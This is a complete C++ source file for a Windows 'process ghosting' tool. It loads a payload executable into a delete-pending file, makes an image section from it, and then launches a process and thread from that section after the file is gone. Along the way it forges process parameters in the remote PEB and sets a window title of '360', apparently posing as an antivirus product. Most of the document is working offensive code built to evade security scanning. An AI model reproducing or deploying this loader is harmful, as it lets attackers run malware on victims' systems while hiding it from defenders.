/*
*  Use: process_ghosting.exe x:\xxx\payload.dat x:\xxx\payload.exe
*/
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <atlconv.h>
#include <UserEnv.h>
#pragma comment(lib, "Ntdll.lib")
#pragma comment(lib, "Userenv.lib")

typedef LONG KPRIORITY;
#define GDI_HANDLE_BUFFER_SIZE      34
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
#ifndef NT_SUCCESS
	#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	HANDLE Handle;

} CURDIR, * PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	USHORT Flags;
	USHORT Length;
	ULONG  TimeStamp;
	STRING DosPath;

} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _PEB_FREE_BLOCK
{
	struct _PEB_FREE_BLOCK* Next;
	ULONG Size;

} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef struct _PEB_
{
	BOOLEAN InheritedAddressSpace;      // These four fields cannot change unless the
	BOOLEAN ReadImageFileExecOptions;   //
	BOOLEAN BeingDebugged;              //
	BOOLEAN SpareBool;                  //
	HANDLE Mutant;                      // INITIAL_PEB structure is also updated.

	PVOID ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID FastPebLockRoutine;
	PVOID FastPebUnlockRoutine;
	ULONG EnvironmentUpdateCount;
	PVOID KernelCallbackTable;
	HANDLE SystemReserved;
	PVOID  AtlThunkSListPtr32;
	PPEB_FREE_BLOCK FreeList;
	ULONG TlsExpansionCounter;
	PVOID TlsBitmap;
	ULONG TlsBitmapBits[2];         // relates to TLS_MINIMUM_AVAILABLE
	PVOID ReadOnlySharedMemoryBase;
	PVOID ReadOnlySharedMemoryHeap;
	PVOID* ReadOnlyStaticServerData;
	PVOID AnsiCodePageData;
	PVOID OemCodePageData;
	PVOID UnicodeCaseTableData;

	//
	// Useful information for LdrpInitialize

	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;

	//
	// Passed up from MmCreatePeb from Session Manager registry key
	//

	LARGE_INTEGER CriticalSectionTimeout;
	ULONG HeapSegmentReserve;
	ULONG HeapSegmentCommit;
	ULONG HeapDeCommitTotalFreeThreshold;
	ULONG HeapDeCommitFreeBlockThreshold;

	//
	// Where heap manager keeps track of all heaps created for a process
	// Fields initialized by MmCreatePeb.  ProcessHeaps is initialized
	// to point to the first free byte after the PEB and MaximumNumberOfHeaps
	// is computed from the page size used to hold the PEB, less the fixed
	// size of this data structure.
	//

	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID* ProcessHeaps;

	//
	//
	PVOID GdiSharedHandleTable;
	PVOID ProcessStarterHelper;
	PVOID GdiDCAttributeList;
	PVOID LoaderLock;

	//
	// Following fields filled in by MmCreatePeb from system values and/or
	// image header. These fields have changed since Windows NT 4.0,
	// so use with caution
	//

	ULONG OSMajorVersion;
	ULONG OSMinorVersion;
	USHORT OSBuildNumber;
	USHORT OSCSDVersion;
	ULONG OSPlatformId;
	ULONG ImageSubsystem;
	ULONG ImageSubsystemMajorVersion;
	ULONG ImageSubsystemMinorVersion;
	ULONG ImageProcessAffinityMask;
	ULONG GdiHandleBuffer[GDI_HANDLE_BUFFER_SIZE];

} PEB_, * PPEB_;

typedef enum _FILE_INFORMATION_CLASS_
{
	FileDirectoryInformation_ = 1,
	FileFullDirectoryInformation,   // 2
	FileBothDirectoryInformation,   // 3
	FileBasicInformation,           // 4  wdm
	FileStandardInformation,        // 5  wdm
	FileInternalInformation,        // 6
	FileEaInformation,              // 7
	FileAccessInformation,          // 8
	FileNameInformation,            // 9
	FileRenameInformation,          // 10
	FileLinkInformation,            // 11
	FileNamesInformation,           // 12
	FileDispositionInformation,     // 13
	FilePositionInformation,        // 14 wdm
	FileFullEaInformation,          // 15
	FileModeInformation,            // 16
	FileAlignmentInformation,       // 17
	FileAllInformation,             // 18
	FileAllocationInformation,      // 19
	FileEndOfFileInformation,       // 20 wdm
	FileAlternateNameInformation,   // 21
	FileStreamInformation,          // 22
	FilePipeInformation,            // 23
	FilePipeLocalInformation,       // 24
	FilePipeRemoteInformation,      // 25
	FileMailslotQueryInformation,   // 26
	FileMailslotSetInformation,     // 27
	FileCompressionInformation,     // 28
	FileObjectIdInformation,        // 29
	FileCompletionInformation,      // 30
	FileMoveClusterInformation,     // 31
	FileQuotaInformation,           // 32
	FileReparsePointInformation,    // 33
	FileNetworkOpenInformation,     // 34
	FileAttributeTagInformation,    // 35
	FileTrackingInformation,        // 36
	FileIdBothDirectoryInformation, // 37
	FileIdFullDirectoryInformation, // 38
	FileValidDataLengthInformation, // 39
	FileShortNameInformation,       // 40
	FileIoCompletionNotificationInformation, // 41
	FileIoStatusBlockRangeInformation,       // 42
	FileIoPriorityHintInformation,           // 43
	FileSfioReserveInformation,              // 44
	FileSfioVolumeInformation,               // 45
	FileHardLinkInformation,                 // 46
	FileProcessIdsUsingFileInformation,      // 47
	FileMaximumInformation                   // 48
} FILE_INFORMATION_CLASS_, * PFILE_INFORMATION_CLASS_;

typedef struct _FILE_DISPOSITION_INFORMATION {
	BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, * PFILE_DISPOSITION_INFORMATION;

typedef struct _RTL_USER_PROCESS_PARAMETERS_
{
	ULONG MaximumLength;                            // Should be set before call RtlCreateProcessParameters
	ULONG Length;                                   // Length of valid structure
	ULONG Flags;                                    // Currently only PPF_NORMALIZED (1) is known:
													//  - Means that structure is normalized by call RtlNormalizeProcessParameters
	ULONG DebugFlags;

	PVOID ConsoleHandle;                            // HWND to console window associated with process (if any).
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;                        // Specified in DOS-like symbolic link path, ex: "C:/WinNT/SYSTEM32"
	UNICODE_STRING DllPath;                         // DOS-like paths separated by ';' where system should search for DLL files.
	UNICODE_STRING ImagePathName;                   // Full path in DOS-like format to process'es file image.
	UNICODE_STRING CommandLine;                     // Command line
	PVOID Environment;                              // Pointer to environment block (see RtlCreateEnvironment)
	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;                            // Fill attribute for console window
	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;                     // Name of WindowStation and Desktop objects, where process is assigned
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[0x20];
	ULONG EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS_, * PRTL_USER_PROCESS_PARAMETERS_;

typedef NTSTATUS(NTAPI* pRtlCreateProcessParametersEx)(
	_Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	_In_ PUNICODE_STRING ImagePathName,
	_In_opt_ PUNICODE_STRING DllPath,
	_In_opt_ PUNICODE_STRING CurrentDirectory,
	_In_opt_ PUNICODE_STRING CommandLine,
	_In_opt_ PVOID Environment,
	_In_opt_ PUNICODE_STRING WindowTitle,
	_In_opt_ PUNICODE_STRING DesktopInfo,
	_In_opt_ PUNICODE_STRING ShellInfo,
	_In_opt_ PUNICODE_STRING RuntimeData,
	_In_ ULONG Flags
	);

typedef NTSTATUS(NTAPI* pNtCreateProcessEx)
(
	OUT PHANDLE				ProcessHandle,
	IN ACCESS_MASK			DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes  OPTIONAL,
	IN HANDLE   ParentProcess,
	IN ULONG    Flags,
	IN HANDLE   SectionHandle OPTIONAL,
	IN HANDLE   DebugPort OPTIONAL,
	IN HANDLE   ExceptionPort OPTIONAL,
	IN BOOLEAN  InJob
	);
typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
	OUT  PHANDLE ThreadHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  HANDLE ProcessHandle,
	IN  PVOID StartRoutine,
	IN  PVOID Argument OPTIONAL,
	IN  ULONG CreateFlags,
	IN  ULONG_PTR ZeroBits,
	IN  SIZE_T StackSize OPTIONAL,
	IN  SIZE_T MaximumStackSize OPTIONAL,
	IN  PVOID AttributeList OPTIONAL
	);
typedef NTSTATUS(NTAPI* pNtCreateSection)(
	PHANDLE            SectionHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER     MaximumSize,
	ULONG              SectionPageProtection,
	ULONG              AllocationAttributes,
	HANDLE             FileHandle
	);

typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(
	IN HANDLE ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);

typedef NTSTATUS (NTAPI* pNtSetInformationFile)(
	IN HANDLE FileHandle,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass
);

static pNtCreateProcessEx	NtCreateProcessEx = nullptr;
static pNtCreateThreadEx	NtCreateThreadEx = nullptr;
static pNtCreateSection		NtCreateSection = nullptr;
static pNtQueryInformationProcess NtQueryInformationProcess_ = nullptr;
static pNtSetInformationFile NtSetInformationFile = nullptr;
static pRtlCreateProcessParametersEx RtlCreateProcessParametersEx = nullptr;

std::wstring Str2WStr(const std::string& str)
{
	try
	{
		USES_CONVERSION;
		return A2W(str.c_str());
	}
	catch (const std::exception&)
	{
		return L"";
	}
}

std::string WStr2Str(const std::wstring& wstr)
{
	try
	{
		USES_CONVERSION;
		return W2A(wstr.c_str());
	}
	catch (const std::exception&)
	{
		return "";
	}
}

const bool CGetCurrentDirectory(std::string& strDirpath)
{
	char szModule[1024] = { 0, };
	GetModuleFileNameA(NULL, szModule, sizeof(szModule) / sizeof(char));
	strDirpath = szModule;
	if (0 >= strDirpath.size())
	{
		OutputDebugString(L"GetModuleFileNameA Error");
		return 0;
	}
	size_t offset = strDirpath.rfind("\\");
	if (0 >= offset)
	{
		OutputDebugString(L"GetModuleFileNameA Size < 0");
		return 0;
	}
	strDirpath = strDirpath.substr(0, offset + 1);
	return true;
}

const bool InitFunction()
{
	const HMODULE hLib = LoadLibraryA("ntdll.dll");
	if (hLib == nullptr) {
		return false;
	}
	{
		const FARPROC pFarProc = GetProcAddress(hLib, "NtCreateProcessEx");
		if (pFarProc) {
			NtCreateProcessEx = (pNtCreateProcessEx)pFarProc;
		}
	}
	{

		const FARPROC pFarProc = GetProcAddress(hLib, "NtCreateThreadEx");
		if (pFarProc) {
			NtCreateThreadEx = (pNtCreateThreadEx)pFarProc;
		}
	}
	{

		const FARPROC pFarProc = GetProcAddress(hLib, "NtCreateSection");
		if (pFarProc) {
			NtCreateSection = (pNtCreateSection)pFarProc;
		}
	}
	{

		const FARPROC pFarProc = GetProcAddress(hLib, "NtQueryInformationProcess");
		if (pFarProc) {
			NtQueryInformationProcess_ = (pNtQueryInformationProcess)pFarProc;
		}
	}
	{

		const FARPROC pFarProc = GetProcAddress(hLib, "NtSetInformationFile");
		if (pFarProc) {
			NtSetInformationFile = (pNtSetInformationFile)pFarProc;
		}
	}
	{

		const FARPROC pFarProc = GetProcAddress(hLib, "RtlCreateProcessParametersEx");
		if (pFarProc) {
			RtlCreateProcessParametersEx = (pRtlCreateProcessParametersEx)pFarProc;
		}
	}

	if (!NtCreateProcessEx || !NtCreateThreadEx || !NtCreateSection || \
		!NtQueryInformationProcess_ || !NtSetInformationFile || !RtlCreateProcessParametersEx)
		return false;
	return true;
}

const DWORD ReadPlayloadData(const std::string& strFullPath, char*& strReadBuf)
{
	bool bRet = false;
	HANDLE hFile = NULL; 
	DWORD dwSize = 0;
	hFile = CreateFileA(strFullPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	do
	{
		if (hFile == INVALID_HANDLE_VALUE)
			break;
		dwSize = GetFileSize(hFile, &dwSize);
		strReadBuf = new char[dwSize + 1];
		if (!strReadBuf)
			break;
		RtlSecureZeroMemory(strReadBuf, dwSize + 1);
		bRet = true;
	} while (false);
	if (hFile) {
		ReadFile(hFile, strReadBuf, dwSize, &dwSize, NULL);
		CloseHandle(hFile);
	}
	return dwSize;
}

const bool GetProcessPeb(HANDLE hProcess, OUT PEB_& peb, PROCESS_BASIC_INFORMATION& pbi)
{
	bool bSuc = false;
	HANDLE hNewDup = nullptr;
	if (DuplicateHandle(GetCurrentProcess(), hProcess, GetCurrentProcess(), &hNewDup, 0, FALSE, DUPLICATE_SAME_ACCESS))
	{
		const NTSTATUS nRet = NtQueryInformationProcess_(hNewDup, ProcessBasicInformation, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
		if (BCRYPT_SUCCESS(nRet)) {
			if (ReadProcessMemory(hNewDup, pbi.PebBaseAddress, &peb, sizeof(PEB_), 0))
			{
				bSuc = true;
				//if (ReadProcessMemory(hNewDup, peb.ProcessParameters, &rups, sizeof(RTL_USER_PROCESS_PARAMETERS), 0))
				//	bSuc = true;
				//else
				//	std::cerr << "[-]  Peb ProcessParameters Failuer" << std::endl;
			}
			else
				std::cerr << "[-]  Peb ReadProcessMemory Failuer" << std::endl;
		}
		else
			std::cerr << "[-]  Peb NtQueryInformationProcess Failuer" << std::endl;
		CloseHandle(hNewDup);
	}
	return bSuc;
}

const ULONGLONG GetEntryPointRva(char*& pData)
{
	try
	{
		PIMAGE_DOS_HEADER pDosHander = (PIMAGE_DOS_HEADER)pData;
#ifdef _WIN64
		PIMAGE_NT_HEADERS pHeadres = (PIMAGE_NT_HEADERS)(pDosHander->e_lfanew + (DWORD64)pData);
#else
		PIMAGE_NT_HEADERS pHeadres = (PIMAGE_NT_HEADERS)(pDosHander->e_lfanew + (LONG)pData);
#endif
		if(pHeadres)
			return pHeadres->OptionalHeader.AddressOfEntryPoint;
		return 0;
	}
	catch (const std::exception&)
	{
		return 0;
	}
}

LPVOID const WriteParamsProcess(const HANDLE& hProcess, const PRTL_USER_PROCESS_PARAMETERS_& params, DWORD protect)
{
	if (!hProcess || !params)
		return nullptr;

	PVOID buffer = params;
	ULONG_PTR buffer_end = (ULONG_PTR)params + params->Length;

	//params and environment in one space:
	if (params->Environment) {
		if ((ULONG_PTR)params > (ULONG_PTR)params->Environment) {
			buffer = (PVOID)params->Environment;
		}
		ULONG_PTR env_end = (ULONG_PTR)params->Environment + params->EnvironmentSize;
		if (env_end > buffer_end) {
			buffer_end = env_end;
		}
	}
	// copy the continuous area containing parameters + environment
	SIZE_T buffer_size = buffer_end - (ULONG_PTR)buffer;
	if (VirtualAllocEx(hProcess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
		if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
			std::cerr << "Writing RemoteProcessParams failed" << std::endl;
			return nullptr;
		}
		if (params->Environment) {
			if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
				std::cerr << "Writing environment failed" << std::endl;
				return nullptr;
			}
		}
		return (LPVOID)params;
	}

	// could not copy the continuous space, try to fill it as separate chunks:
	if (!VirtualAllocEx(hProcess, (LPVOID)params, params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
		std::cerr << "Allocating RemoteProcessParams failed" << std::endl;
		return nullptr;
	}
	if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
		std::cerr << "Writing RemoteProcessParams failed" << std::endl;
		return nullptr;
	}
	if (params->Environment) {
		if (!VirtualAllocEx(hProcess, (LPVOID)params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
			std::cerr << "Allocating environment failed" << std::endl;
			return nullptr;
		}
		if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
			std::cerr << "Writing environment failed" << std::endl;
			return nullptr;
		}
	}
	return (LPVOID)params;
}

const bool SetProcessParameter(const HANDLE& hProcess, const std::string& targetPath, const ULONGLONG uPebBaseAddr)
{
	// Set Process Parameter
	const std::wstring wTarGetPath = Str2WStr(targetPath).c_str();
	UNICODE_STRING uTargetPath = { 0 };
	RtlInitUnicodeString(&uTargetPath, wTarGetPath.c_str());

	std::wstring::size_type wStrType = wTarGetPath.find_last_of('\\');
	if (wStrType == std::wstring::npos)
		return false;

	std::wstring wstrTarGetCurrentDir = wTarGetPath.substr(0, wStrType);
	if (wstrTarGetCurrentDir.empty())
		return false;

	UNICODE_STRING uTGetCurrentDir = { 0 };
	RtlInitUnicodeString(&uTGetCurrentDir, wstrTarGetCurrentDir.c_str());

	const wchar_t dllDir[] = L"C:\\Windows\\System32";
	UNICODE_STRING uDllDir = { 0 };
	RtlInitUnicodeString(&uDllDir, dllDir);

	UNICODE_STRING uWindowName = { 0 };
	const wchar_t* windowName = (LPWSTR)L"360";
	RtlInitUnicodeString(&uWindowName, windowName);

	LPVOID environment;
	CreateEnvironmentBlock(&environment, NULL, TRUE);

	PRTL_USER_PROCESS_PARAMETERS_ params = nullptr;
	NTSTATUS nStu = RtlCreateProcessParametersEx(
		(PRTL_USER_PROCESS_PARAMETERS*)(&params),
		(PUNICODE_STRING)&uTargetPath,
		(PUNICODE_STRING)&uDllDir,
		(PUNICODE_STRING)&uTGetCurrentDir,
		(PUNICODE_STRING)&uTargetPath,
		environment,
		(PUNICODE_STRING)&uWindowName,
		nullptr,
		nullptr,
		nullptr,
		RTL_USER_PROC_PARAMS_NORMALIZED
	);

	if (!NT_SUCCESS(nStu)) {
		std::cerr << "[-] RtlCreateProcessParametersEx failed" << std::endl;
		return false;
	}

	LPVOID pRemoteParams = WriteParamsProcess(hProcess, params, PAGE_READWRITE);
	if (!pRemoteParams) {
		std::cout << "[-] Cannot make a remote copy of parameters: " << GetLastError() << std::endl;
		return false;
	}

	// Set Params In Peb
	{
		// Get access to the remote PEB:
		ULONGLONG remote_peb_addr = uPebBaseAddr;
		if (!remote_peb_addr) {
			std::cerr << "[-] Failed getting remote PEB address!" << std::endl;
			return false;
		}

		PEB peb_copy = { 0 };
		ULONGLONG offset = (ULONGLONG)&peb_copy.ProcessParameters - (ULONGLONG)&peb_copy;

		// Calculate offset of the parameters
		LPVOID remote_img_base = (LPVOID)(remote_peb_addr + offset);

		//Write parameters address into PEB:
		SIZE_T written = 0;
		if (!WriteProcessMemory(hProcess, remote_img_base,
			&pRemoteParams, sizeof(PVOID),
			&written))
		{
			std::cout << "[-] Cannot update Params!" << std::endl;
			return false;
		}
		return true;
	}
}

int main(int argc, char* argv[])
{
	if (argc < 3) {
		std::cout << "[-] Parameter Path Error..." << std::endl;
		return 0;
	}

	const std::string sPayLoadPath = argv[1];
	if (sPayLoadPath.empty()) {
		std::cout << "[-] Parameter PayLoad Path Error..." << std::endl;
		return 0;
	}

	const std::string sTargetPath = argv[2];
	if (sTargetPath.empty()) {
		std::cout << "[-] Parameter Target Path Error..." << std::endl;
		return 0;
	}

	// Read Playload to BufData
	char* pPayLoadData = nullptr;
	const DWORD dwDataSize = ReadPlayloadData(sPayLoadPath, pPayLoadData);
	if (!pPayLoadData) {
		std::cout << "[-] Read Payload Data Failuer, Path: " << sPayLoadPath.c_str() << std::endl;
		return 0;
	}
	std::cout << "[+] Read Payload Data Success, Path: " << sPayLoadPath.c_str() << std::endl;

	if (!InitFunction()) {
		std::cout << "[-] Init Function Failuer, Path: " << std::endl;
		return 0;
	}
	
	// 1. Create New File
	HANDLE hFile = CreateFileA(
		sTargetPath.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE,
		NULL);

	if (INVALID_HANDLE_VALUE == hFile || !hFile) {
		std::cout << "[-] Create New TargetPath File Failuer, Path: " << sTargetPath.c_str() << std::endl;
		return 0;
	}

	HANDLE hSection = nullptr;
	HANDLE hProcess = nullptr;
	do
	{
		// Set FileAttr Delete on Close FILE_FLAG_DELETE_ON_CLOSE
		IO_STATUS_BLOCK status_block = { 0 };
		FILE_DISPOSITION_INFORMATION info = { 0 };
		info.DeleteFile = TRUE;
		NTSTATUS hStu = NtSetInformationFile(hFile, &status_block, &info, sizeof(info), (FILE_INFORMATION_CLASS)FileDispositionInformation);
		if (!NT_SUCCESS(hStu)) {
			std::cout << "[-] SetInformationFile Delete Failuer, Path: " << sTargetPath.c_str() << std::endl;
			break;
		}

		// 3. Write Data Flush
		DWORD dWriteLens = 0;
		OVERLAPPED overped = { 0, };
		WriteFile(hFile, pPayLoadData, dwDataSize, &dWriteLens, &overped);
		FlushFileBuffers(hFile);

		// 4. Craete Section
		hStu = NtCreateSection(&hSection,
			SECTION_ALL_ACCESS,
			NULL,
			0,
			PAGE_READONLY,
			SEC_IMAGE,
			hFile
		);
		if (!NT_SUCCESS(hStu) || !hSection) {
			std::cout << "[-] CreateSection Failuer, Path: " << sTargetPath.c_str() << std::endl;
			break;
		}
		std::cout << "[+] CreateSection Success, Path: " << sTargetPath.c_str() << std::endl;

		// 5. Close File Handle -- File Mark Delete & Delete
		if (hFile) {
			CloseHandle(hFile);
			hFile = NULL;
		}

		// 6. CreateProcessEx
		hStu = NtCreateProcessEx(
			&hProcess,
			PROCESS_ALL_ACCESS,
			NULL,
			GetCurrentProcess(),
			4,// PS_INHERIT_HANDLES
			hSection,
			NULL,
			NULL,
			FALSE
		);
		if (!NT_SUCCESS(hStu) || !hProcess) {
			std::cout << "[-] CreateProcess Failuer, Path: " << sTargetPath.c_str() << std::endl;
			break;
		}
		std::cout << "[+] CreateProcess Success, Path: " << sTargetPath.c_str() << std::endl;

		// 7. Get Pe ImageBase pEntry
		PEB_ pebData = { 0 }; PROCESS_BASIC_INFORMATION pbi = { 0, };
		if (!GetProcessPeb(hProcess, pebData, pbi)) {
			std::cout << "[-] Get ProcessPeb Failuer, Handle: " << hProcess << std::endl;
			break;
		}
		ULONGLONG uImageBaseAddr = (ULONGLONG)pebData.ImageBaseAddress;
		std::cout << "[+] Get Process ImageBase Success, Handle: " << hProcess << " ImageBaseAddr: " << uImageBaseAddr << std::endl;

		// Get File Oep
		ULONGLONG procEntry = 0;
		const ULONGLONG dwPayLoadEp = GetEntryPointRva(pPayLoadData);
		if (dwPayLoadEp) {
			procEntry = dwPayLoadEp + uImageBaseAddr;
		}
		else {
			std::cout << "[-] Get PE Rva Failuer, Handle: " << hProcess << std::endl;
			break;
		}
		std::cout << "[+] Get OEP Success, Handle: " << hProcess << " OEPAddr: " << procEntry << std::endl;
		
		// Create 
		if (!SetProcessParameter(hProcess, sTargetPath, (ULONGLONG)pbi.PebBaseAddress)) {
			std::cout << "[-] Set Process Parameter Failuer, Handle: " << hProcess << std::endl;
		}

		// 8. CreateThread ImageBase
		HANDLE hThread = NULL;
		hStu = NtCreateThreadEx(&hThread,
			THREAD_ALL_ACCESS,
			NULL,
			hProcess,
			(LPTHREAD_START_ROUTINE)procEntry,
			NULL,
			FALSE,
			0,
			0,
			0,
			NULL
		);
		if (!NT_SUCCESS(hStu)) {
			std::cout << "[-] CreateThread Pointer Pe Runing Failuer, Handle: " << hProcess << std::endl;
			break;
		}
		std::cout << "[+] CreateThread Runing Success, Handle " << hProcess << " Tid: " << hThread << std::endl;
	} while (false);
		
	// clear
	if (pPayLoadData) {
		delete[] pPayLoadData; pPayLoadData = nullptr;
	}
	if (hSection) {
		CloseHandle(hSection);
		hSection = NULL;
	}
	if (hFile) {
		CloseHandle(hFile);
		hFile = NULL;
	}
	if (hProcess) {
		CloseHandle(hProcess);
		hProcess = NULL;
	}
	return 0;
}